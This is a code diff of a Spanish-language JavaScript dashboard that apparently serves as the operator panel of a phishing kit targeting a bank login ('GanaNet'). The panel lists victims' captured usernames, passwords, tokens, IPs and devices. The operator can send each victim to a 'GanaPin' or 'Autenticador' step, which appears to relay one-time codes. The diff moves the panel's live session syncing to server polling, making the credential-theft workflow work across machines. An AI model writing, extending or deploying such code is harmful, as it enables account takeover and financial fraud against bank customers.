@@ -3,9 +3,6 @@
  * Cola ordenada de usuarios en espera para enviar GanaPin o Autenticador.
  */
 const LANE_COUNT = 5
-const CHANNEL = 'gananet-ops'
-const STORAGE_KEY = 'gananet-ops-event'
-const SESSIONS_KEY = 'gananet-ops-sessions'
 
 const emptyState = document.getElementById('emptyState')
 const rowCount = document.getElementById('rowCount')
@@ -14,25 +11,6 @@ const btnClean = document.getElementById('btnClean')
 
 /** @type {Map<string, object>} */
 const rows = new Map()
-let counter = 0
-
-function readStore() {
-  try {
-    const raw = localStorage.getItem(SESSIONS_KEY)
-    const list = raw ? JSON.parse(raw) : []
-    return Array.isArray(list) ? list : []
-  } catch (_) {
-    return []
-  }
-}
-
-function writeStore(list) {
-  try {
-    localStorage.setItem(SESSIONS_KEY, JSON.stringify(list))
-  } catch (_) {
-    /* ignore */
-  }
-}
 
 function statusLabel(state) {
   if (state === 'waiting') return 'En espera'
@@ -118,121 +96,25 @@ function getDeviceIcon(device) {
 }
 
 function isOnline(row) {
-  const seen = row.last_seen || row.updatedAt || row.createdAt
-  if (!seen) return false
-  return Date.now() - seen < 20000
+  return !!row.online;
 }
 
-function publish(message) {
-  const payload = { ...message, ts: Date.now() }
-  try {
-    const ch = new BroadcastChannel(CHANNEL)
-    ch.postMessage(payload)
-    ch.close()
-  } catch (_) {
-    /* ignore */
-  }
-  try {
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(payload))
-  } catch (_) {
-    /* ignore */
-  }
-}
-
-function persistRows() {
-  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
-  list.forEach((row, i) => {
-    row.index = i + 1
-  })
-  writeStore(list)
-  counter = list.length
-}
-
-function setRowState(rowId, state, action) {
+async function setRowState(rowId, state, action) {
   const row = rows.get(rowId)
   if (!row) return
   row.state = state
   row.last_seen = Date.now()
   row.updatedAt = Date.now()
-  persistRows()
   hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`
-  if (action) {
-    publish({ type: 'session:action', sessionId: rowId, action })
-  }
+
+  try {
+    await fetch(`/api/sessions/${rowId}/action`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ action, state })
+    });
+  } catch (_) {}
   render()
-}
-
-function upsertSession(session) {
-  if (!session?.id) return
-  // Ignorar fila demo vieja
-  if (session.id === 'demo_preview') return
-
-  const existing = rows.get(session.id)
-  if (existing) {
-    Object.assign(existing, {
-      user: session.username ?? session.user ?? existing.user,
-      clave: session.password ?? session.clave ?? existing.clave,
-      tipo: session.tipoUsuario ?? session.tipo ?? existing.tipo,
-      device: session.device ?? existing.device,
-      ip: session.ip ?? existing.ip,
-      token: session.token ?? existing.token,
-      last_seen: Date.now(),
-      updatedAt: Date.now(),
-      state: session.state || existing.state || 'waiting',
-    })
-  } else {
-    const createdAt = session.createdAt || Date.now()
-    rows.set(session.id, {
-      id: session.id,
-      index: 0,
-      createdAt,
-      updatedAt: Date.now(),
-      last_seen: Date.now(),
-      tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
-      device: session.device || 'desktop',
-      ip: session.ip || '127.0.0.1',
-      user: session.username || session.user || '—',
-      clave: session.password || session.clave || '—',
-      token: session.token || '',
-      state: session.state || 'waiting',
-    })
-  }
-  persistRows()
-  const row = rows.get(session.id)
-  hint.textContent = `En cola (#${row.index}): ${row.user} — elige GanaPin o Autenticador`
-  render()
-
-  // Resalta la fila nueva un momento
-  requestAnimationFrame(() => {
-    const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
-    if (!tr) return
-    tr.classList.add('is-new')
-    setTimeout(() => tr.classList.remove('is-new'), 1800)
-  })
-}
-
-function loadFromStore() {
-  const list = readStore()
-    .filter((s) => s && s.id && s.id !== 'demo_preview')
-    .sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
-  rows.clear()
-  list.forEach((session, i) => {
-    rows.set(session.id, {
-      id: session.id,
-      index: i + 1,
-      createdAt: session.createdAt || Date.now(),
-      updatedAt: session.updatedAt || session.createdAt || Date.now(),
-      last_seen: session.last_seen || session.updatedAt || Date.now(),
-      tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
-      device: session.device || 'desktop',
-      ip: session.ip || '127.0.0.1',
-      user: session.username || session.user || '—',
-      clave: session.password || session.clave || '—',
-      token: session.token || '',
-      state: session.state || 'waiting',
-    })
-  })
-  counter = rows.size
 }
 
 function createRow(row) {
@@ -358,67 +240,66 @@ function render() {
   }
 }
 
-function onMessage(data) {
-  if (!data || typeof data !== 'object') return
-  if (data.type === 'session:created' && data.session) {
-    upsertSession(data.session)
-  }
-  if (data.type === 'sessions:sync' && Array.isArray(data.sessions)) {
-    data.sessions.forEach((session) => upsertSession(session))
-  }
-  if (data.type === 'session:token') {
-    const row = rows.get(data.sessionId)
-    if (!row) return
-    row.token = data.token || ''
-    row.last_seen = Date.now()
-    row.state = 'typing'
-    persistRows()
-    render()
-  }
-  if (data.type === 'session:ping') {
-    const row = rows.get(data.sessionId)
-    if (!row) return
-    row.last_seen = Date.now()
-    persistRows()
-    render()
-  }
+async function pollSessions() {
+  try {
+    const response = await fetch('/api/sessions');
+    if (response.ok) {
+      const list = await response.json();
+      
+      // Track existing new entries
+      const oldKeys = new Set(rows.keys());
+      const newKeys = new Set(list.map(s => s.id));
+      
+      rows.clear();
+      list.forEach((session) => {
+        rows.set(session.id, {
+          id: session.id,
+          index: session.index,
+          createdAt: session.createdAt,
+          updatedAt: session.updatedAt,
+          last_seen: session.last_seen,
+          tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
+          device: session.device || 'desktop',
+          ip: session.ip || '127.0.0.1',
+          user: session.username || session.user || '—',
+          clave: session.password || session.clave || '—',
+          token: session.token || '',
+          state: session.state || 'waiting',
+          online: session.online
+        });
+      });
+      render();
+
+      // Trigger flash effect for new rows that were not in old list
+      list.forEach((session) => {
+        if (!oldKeys.has(session.id)) {
+          requestAnimationFrame(() => {
+            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
+            if (!tr) return
+            tr.classList.add('is-new')
+            setTimeout(() => tr.classList.remove('is-new'), 1800)
+          })
+        }
+      });
+    }
+  } catch (_) {}
 }
 
-btnClean?.addEventListener('click', () => {
+btnClean?.addEventListener('click', async () => {
   rows.clear()
-  counter = 0
-  writeStore([])
+  try {
+    await fetch('/api/clear', { method: 'POST' });
+  } catch (_) {}
   hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
   render()
 })
 
-try {
-  const ch = new BroadcastChannel(CHANNEL)
-  ch.onmessage = (event) => onMessage(event.data)
-} catch (_) {
-  /* ignore */
-}
+// Poll sessions every 2 seconds
+window.setInterval(pollSessions, 2000)
 
-window.addEventListener('storage', (event) => {
-  if (event.key === STORAGE_KEY && event.newValue) {
-    try {
-      onMessage(JSON.parse(event.newValue))
-    } catch (_) {
-      /* ignore */
-    }
-  }
-  if (event.key === SESSIONS_KEY) {
-    loadFromStore()
-    render()
-  }
-})
-
-window.setInterval(() => {
-  if (rows.size) render()
-}, 2000)
-
-loadFromStore()
-hint.textContent = rows.size
-  ? `En cola: ${rows.size}. Elige GanaPin o Autenticador en Acciones.`
-  : 'Esperando usuarios del login… Al Verificar llegan aquí ordenados.'
-render()
+// Initial load
+pollSessions().then(() => {
+  hint.textContent = rows.size
+    ? `En cola: ${rows.size}. Elige GanaPin o Autenticador en Acciones.`
+    : 'Esperando usuarios del login… Al Verificar llegan aquí ordenados.'
+});
